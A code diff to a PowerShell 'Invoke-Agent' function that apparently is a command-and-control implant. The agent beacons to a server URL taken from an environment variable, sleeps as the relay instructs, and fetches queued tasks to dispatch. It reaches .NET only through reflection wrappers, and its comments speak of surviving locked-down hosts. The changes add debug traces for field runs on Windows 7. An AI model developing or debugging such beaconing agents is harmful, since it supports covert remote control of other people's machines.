@@ -385,6 +385,15 @@ function Invoke-Agent {
     # Process-wide ServicePointManager state — set before the first request, guarded so a
     # locked-down host can't make the agent fail before it beacons. The binder refuses
     # int->enum, so the flags value is rebuilt through Enum.ToObject.
+    # Win7 FIELD (2026-09-23): the field box still showed no [3] — the bump STILL throws on
+    # CLR2 — and because Expect100Continue shared the try, it silently stayed TRUE there
+    # (a behavioral divergence from 5.1 on EVERY POST). Expect100 is now independent
+    # (own guard, set FIRST); the bump carries the [3a]/[3b] popups so the next field run
+    # pins which line throws.
+    try {
+        SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
+        Dbg '[3c] expect100' 'off' #dbg
+    } catch {}
     try {
         # PS 2.0 FIELD FIX (Win7, 2026-09-22): the helpers return COMMA-WRAPPED (object[1]).
         # $proto.GetType() on the wrapper returned object[] → Enum.ToObject threw → the whole
@@ -393,11 +402,12 @@ function Invoke-Agent {
         # binding semantics (no-op on a raw scalar), and $tls12 is unwrapped so SetPropS's
         # internal @() can't re-nest it into a binder-opaque object[1][].
         $proto = @((GetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol'))[0]
+        Dbg '[3a] proto' ('' + [int]$proto) #dbg
         if (([int]$proto -band 3072) -eq 0) {
             $tls12 = @((CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072))))[0]
+            Dbg '[3b] bump to' ('' + [int]$tls12) #dbg
             SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' $tls12
         }
-        SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
         Dbg '[3] tls' 'applied' #dbg
     } catch {}
     $script:beaconUrl = ReadEnv 'H_URL'
@@ -431,7 +441,25 @@ function Invoke-Agent {
         # response stream closes. WebHeaderCollection.Get replaces the indexer (the
         # indexer is a parameterized property reflection won't address by name).
         try { $script:localSleepSec = CallStatic (ResolveM 'System.Math') 'Max' @(0, (CallStatic (ResolveM 'System.Math') 'Min' @(600, [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint'))))) } catch { $script:localSleepSec = 0 }
-        try { $answer = ReadAllBytes (CallInst $resp 'GetResponseStream' $null) } catch { $answer = New-Object 'byte[]' 0 } finally { $null = CallInst $resp 'Close' $null }
+        # Win7 field trace round 2 (2026-09-23): a clean single-runtime run STILL never
+        # dispatched — the two candidates left are (A) the relay never answers with frames
+        # and (B) the PS 2.0 read path swallows a non-empty answer (the catch below masks a
+        # read failure as an EMPTY answer, indistinguishable from idle). [resp] cl fires
+        # ONLY on a non-empty ContentLength — no box ever while the panel says Sent = the
+        # relay side (A); a box + no [ans] = the read eats it (B); a box + [read] threw =
+        # B with the exception named. All #dbg.
+        try { #dbg
+            $respCl = GetProp $resp 'ContentLength' #dbg
+            if (([int]$respCl) -gt 0) { Dbg '[resp] cl' ('' + $respCl) } #dbg
+        } catch {} #dbg
+        try {
+            $answer = ReadAllBytes (CallInst $resp 'GetResponseStream' $null)
+        } catch {
+            Dbg '[read] threw' $_.Exception.Message #dbg
+            $answer = New-Object 'byte[]' 0
+        } finally {
+            $null = CallInst $resp 'Close' $null
+        }
         $pending = @()
         # Empty answer = nothing queued — re-POST after the hint. The idle log ships
         # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
